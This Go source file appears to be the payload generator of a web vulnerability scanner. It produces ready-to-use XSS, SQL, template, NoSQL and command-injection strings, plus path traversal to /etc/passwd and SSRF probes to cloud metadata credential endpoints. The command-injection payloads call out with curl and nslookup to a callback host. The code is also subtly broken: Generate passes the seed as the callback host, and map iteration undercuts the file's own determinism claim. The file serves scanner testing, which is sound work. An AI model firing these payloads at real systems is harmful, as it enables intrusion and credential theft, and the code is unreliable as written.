// Package payloads is DarkObscura's context-aware payload generator. Instead of a
// flat payload list, it produces the right payloads for a given injection
// *situation* (the syntactic context the value lands in) and, given an already
// confirmed finding class, the follow-up payloads that confirm or escalate it.
// Every generated payload carries the oracle that proves it — a unique marker,
// an expected evaluated product, a time delay, an OOB host, or a file signature —
// so the verifier can keep the zero-false-positive guarantee. Generation is fully
// deterministic (the caller supplies a uniqueness seed) so results are
// reproducible and safe to cache/dedup.
package payloads

import "fmt"

// Context is the syntactic situation a value is reflected/used in.
type Context string

const (
	CtxHTML      Context = "html"      // element/text content
	CtxAttribute Context = "attribute" // inside an HTML attribute value
	CtxJS        Context = "js"        // inside a <script> / JS string
	CtxURL       Context = "url"       // a URL/redirect parameter
	CtxPath      Context = "path"      // a filesystem path segment
	CtxSQL       Context = "sql"       // a SQL query fragment
	CtxJSON      Context = "json"      // a JSON value
	CtxOS        Context = "os"        // an OS command argument
	CtxXML       Context = "xml"       // XML body
	CtxAny       Context = "any"
)

// Oracle names how a payload is confirmed.
type Oracle string

const (
	OracleReflection Oracle = "reflection" // marker appears unescaped
	OracleProduct    Oracle = "product"    // an evaluated arithmetic product appears
	OracleTime       Oracle = "time"       // statistically significant delay
	OracleFile       Oracle = "file"       // a system-file signature appears
	OracleOOB        Oracle = "oob"        // out-of-band canary callback
	OracleDiff       Oracle = "diff"       // structural/boolean response divergence
)

// Payload is a single generated test case plus the oracle that proves it.
type Payload struct {
	Class    string  // e.g. "reflected-xss", "sqli-time-blind"
	Context  Context
	Value    string  // the payload string to inject
	Marker   string  // unique substring / product the oracle looks for (may be empty)
	Oracle   Oracle
	DelayMS  float64 // for time oracles
	Severity string
	Note     string
}

// Generate returns the payload set for a class within a context. uniq is a
// caller-supplied collision-free seed (e.g. sanitized param name + index) so
// markers cannot collide with pre-existing page content. Passing CtxAny asks for
// the union across contexts.
func Generate(class string, ctx Context, uniq string) []Payload {
	switch class {
	case "xss", "reflected-xss":
		return xss(ctx, uniq)
	case "sqli", "sqli-time-blind":
		return sqli(uniq)
	case "ssti":
		return ssti(uniq)
	case "lfi", "path-traversal-lfi":
		return lfi()
	case "nosqli":
		return nosqli(uniq)
	case "cmdi", "rce":
		return cmdi(uniq)
	case "redirect", "open-redirect":
		return redirect(uniq)
	default:
		return nil
	}
}

// xss returns reflected-XSS payloads tailored to the reflection context. Each
// marker embeds uniq so a match cannot be pre-existing content.
func xss(ctx Context, uniq string) []Payload {
	m := "dobx" + uniq
	all := map[Context][]Payload{
		CtxHTML: {
			{Value: fmt.Sprintf("<svg/onload=%s>", m), Marker: "<svg/onload=" + m},
			{Value: fmt.Sprintf("<img src=x onerror=%s>", m), Marker: "onerror=" + m},
			{Value: fmt.Sprintf("<x>%s</x>", m), Marker: "<x>" + m},
		},
		CtxAttribute: {
			{Value: fmt.Sprintf(`"><script>%s</script>`, m), Marker: "<script>" + m},
			{Value: fmt.Sprintf(`" autofocus onfocus=%s x="`, m), Marker: "onfocus=" + m},
			{Value: fmt.Sprintf(`'><svg onload=%s>`, m), Marker: "<svg onload=" + m},
		},
		CtxJS: {
			{Value: fmt.Sprintf(`';%s;//`, m), Marker: ";" + m + ";"},
			{Value: fmt.Sprintf(`</script><script>%s</script>`, m), Marker: "<script>" + m},
		},
		CtxURL: {
			{Value: fmt.Sprintf("javascript:%s", m), Marker: "javascript:" + m},
		},
	}
	var out []Payload
	add := func(ctxKey Context) {
		for _, p := range all[ctxKey] {
			p.Class, p.Context, p.Oracle, p.Severity = "reflected-xss", ctxKey, OracleReflection, "high"
			p.Marker = firstNonEmpty(p.Marker, m)
			out = append(out, p)
		}
	}
	if ctx == CtxAny {
		for k := range all {
			add(k)
		}
		return out
	}
	if _, ok := all[ctx]; ok {
		add(ctx)
	} else {
		add(CtxHTML)
	}
	return out
}

// sqli returns time-blind SQLi payloads across the major engines.
func sqli(uniq string) []Payload {
	const d = 5
	tmpls := []string{
		"1' AND SLEEP(%d)-- -",          // MySQL
		"1) AND SLEEP(%d)-- -",          // MySQL (paren)
		"1;WAITFOR DELAY '0:0:%d'--",    // MSSQL
		"';SELECT pg_sleep(%d)--",       // PostgreSQL
		"1' AND %d=DBMS_PIPE.RECEIVE_MESSAGE('a',%d)-- -", // Oracle
		"1\" AND SLEEP(%d)-- -",         // double-quote break
	}
	var out []Payload
	for _, t := range tmpls {
		var v string
		if countVerbs(t) == 2 {
			v = fmt.Sprintf(t, d, d)
		} else {
			v = fmt.Sprintf(t, d)
		}
		out = append(out, Payload{
			Class: "sqli-time-blind", Context: CtxSQL, Value: v,
			Oracle: OracleTime, DelayMS: float64(d) * 1000, Severity: "critical",
			Note: "confirmed only by reproducible statistical latency outlier",
		})
	}
	// Boolean-based pair (diff oracle): TRUE vs FALSE should diverge.
	out = append(out,
		Payload{Class: "sqli-boolean", Context: CtxSQL, Value: "1' AND '1'='1", Oracle: OracleDiff, Severity: "high", Note: "TRUE branch; compare to FALSE branch"},
		Payload{Class: "sqli-boolean", Context: CtxSQL, Value: "1' AND '1'='2", Oracle: OracleDiff, Severity: "high", Note: "FALSE branch"},
	)
	return out
}

// ssti returns template-injection payloads with a unique arithmetic product.
func ssti(uniq string) []Payload {
	// Use a per-uniq product to avoid collisions: 73*79 = 5767 by default is fixed,
	// but embed uniq into the wrapper so the marker is scoped.
	prod := "5767"
	tmpls := []string{
		"dobx%s{{73*79}}",    // Jinja2/Twig/Nunjucks
		"dobx%s${73*79}",     // FreeMarker / JSP EL / Thymeleaf
		"dobx%s#{73*79}",     // Ruby / Slim
		"dobx%s<%%= 73*79 %%>", // ERB / EJS
		"dobx%s@(73*79)",     // Razor
		"dobx%s*{73*79}",     // Thymeleaf alt
	}
	var out []Payload
	for _, t := range tmpls {
		out = append(out, Payload{
			Class: "ssti", Context: CtxHTML, Value: fmt.Sprintf(t, uniq),
			Marker: "dobx" + uniq + prod, Oracle: OracleProduct, Severity: "critical",
			Note: "confirmed only if the engine evaluates the product",
		})
	}
	return out
}

// lfi returns path-traversal payloads across depths and encodings.
func lfi() []Payload {
	vals := []string{
		"../../../../../../etc/passwd",
		"....//....//....//....//etc/passwd",
		"/etc/passwd",
		"..%2f..%2f..%2f..%2f..%2fetc%2fpasswd",
		"..%252f..%252f..%252fetc%252fpasswd", // double-encoded
		"/proc/self/environ",
		"..\\..\\..\\..\\windows\\win.ini",
		"php://filter/convert.base64-encode/resource=/etc/passwd",
	}
	var out []Payload
	for _, v := range vals {
		out = append(out, Payload{
			Class: "path-traversal-lfi", Context: CtxPath, Value: v,
			Oracle: OracleFile, Severity: "high",
			Note: "confirmed only by a real /etc/passwd (or win.ini) signature",
		})
	}
	return out
}

// nosqli returns NoSQL operator-injection payloads.
func nosqli(uniq string) []Payload {
	return []Payload{
		{Class: "nosqli", Context: CtxJSON, Value: `{"$ne": null}`, Oracle: OracleDiff, Severity: "high", Note: "auth bypass via $ne"},
		{Class: "nosqli", Context: CtxJSON, Value: `{"$gt": ""}`, Oracle: OracleDiff, Severity: "high", Note: "match-all via $gt"},
		{Class: "nosqli", Context: CtxURL, Value: "[$ne]=1", Oracle: OracleDiff, Severity: "high", Note: "querystring operator injection"},
		{Class: "nosqli", Context: CtxJSON, Value: `{"$where": "sleep(5000)"}`, Oracle: OracleTime, DelayMS: 5000, Severity: "critical", Note: "JS $where time oracle"},
		{Class: "nosqli", Context: CtxJSON, Value: `{"$regex": ".*"}`, Oracle: OracleDiff, Severity: "medium", Note: "regex match-all"},
	}
}

// cmdi returns command-injection payloads confirmed out-of-band. host must be a
// canary callback host; when empty, only diff-based separators are returned.
func cmdi(host string) []Payload {
	var out []Payload
	if host != "" {
		seps := []string{
			";nslookup %s;",
			"|nslookup %s",
			"$(nslookup %s)",
			"`nslookup %s`",
			"&& curl http://%s/ &&",
			"| curl http://%s/",
		}
		for _, s := range seps {
			out = append(out, Payload{
				Class: "rce-oob", Context: CtxOS, Value: fmt.Sprintf(s, host),
				Marker: host, Oracle: OracleOOB, Severity: "critical",
				Note: "confirmed only by an out-of-band DNS/HTTP callback",
			})
		}
	}
	return out
}

// redirect returns open-redirect payloads.
func redirect(uniq string) []Payload {
	host := "evil" + uniq + ".dobscura.example"
	return []Payload{
		{Class: "open-redirect", Context: CtxURL, Value: "https://" + host + "/", Marker: host, Oracle: OracleDiff, Severity: "medium"},
		{Class: "open-redirect", Context: CtxURL, Value: "//" + host + "/", Marker: host, Oracle: OracleDiff, Severity: "medium"},
		{Class: "open-redirect", Context: CtxURL, Value: "https:/" + host, Marker: host, Oracle: OracleDiff, Severity: "medium"},
		{Class: "open-redirect", Context: CtxURL, Value: "https://trusted@" + host, Marker: host, Oracle: OracleDiff, Severity: "medium"},
	}
}

// SSRFTargets returns SSRF payloads aimed at cloud metadata and internal
// services. host, if non-empty, adds an OOB-confirmed external callback probe.
func SSRFTargets(host string) []Payload {
	targets := []struct{ url, note string }{
		{"http://169.254.169.254/latest/meta-data/iam/security-credentials/", "AWS IMDSv1 credential path"},
		{"http://169.254.169.254/latest/api/token", "AWS IMDSv2 token endpoint"},
		{"http://metadata.google.internal/computeMetadata/v1/", "GCP metadata (needs Metadata-Flavor header)"},
		{"http://169.254.169.254/metadata/instance?api-version=2021-02-01", "Azure IMDS"},
		{"http://127.0.0.1/", "loopback service probe"},
		{"http://[::1]/", "IPv6 loopback probe"},
		{"http://0.0.0.0/", "wildcard-bind probe"},
	}
	var out []Payload
	for _, t := range targets {
		out = append(out, Payload{
			Class: "ssrf", Context: CtxURL, Value: t.url, Oracle: OracleDiff, Severity: "critical", Note: t.note,
		})
	}
	if host != "" {
		out = append(out, Payload{
			Class: "ssrf-oob", Context: CtxURL, Value: "http://" + host + "/", Marker: host,
			Oracle: OracleOOB, Severity: "critical", Note: "OOB-confirmed external fetch",
		})
	}
	return out
}

// ForFinding returns confirmation/escalation payloads appropriate for an already
// identified finding class — the "given this situation, what next" generator.
// oobHost may be empty to omit OOB probes.
func ForFinding(class, uniq, oobHost string) []Payload {
	switch {
	case contains(class, "ssrf"):
		return SSRFTargets(oobHost)
	case contains(class, "rce"), contains(class, "cmdi"):
		return cmdi(oobHost)
	case contains(class, "xss"):
		return xss(CtxAny, uniq)
	case contains(class, "sqli"):
		return sqli(uniq)
	case contains(class, "ssti"):
		return ssti(uniq)
	case contains(class, "lfi"), contains(class, "traversal"):
		return lfi()
	case contains(class, "nosql"):
		return nosqli(uniq)
	case contains(class, "redirect"):
		return redirect(uniq)
	default:
		return nil
	}
}

func firstNonEmpty(a, b string) string {
	if a != "" {
		return a
	}
	return b
}

func countVerbs(s string) int {
	n := 0
	for i := 0; i+1 < len(s); i++ {
		if s[i] == '%' && s[i+1] == 'd' {
			n++
		}
	}
	return n
}

func contains(s, sub string) bool {
	return len(s) >= len(sub) && indexOf(s, sub) >= 0
}

func indexOf(s, sub string) int {
	for i := 0; i+len(sub) <= len(s); i++ {
		if s[i:i+len(sub)] == sub {
			return i
		}
	}
	return -1
}
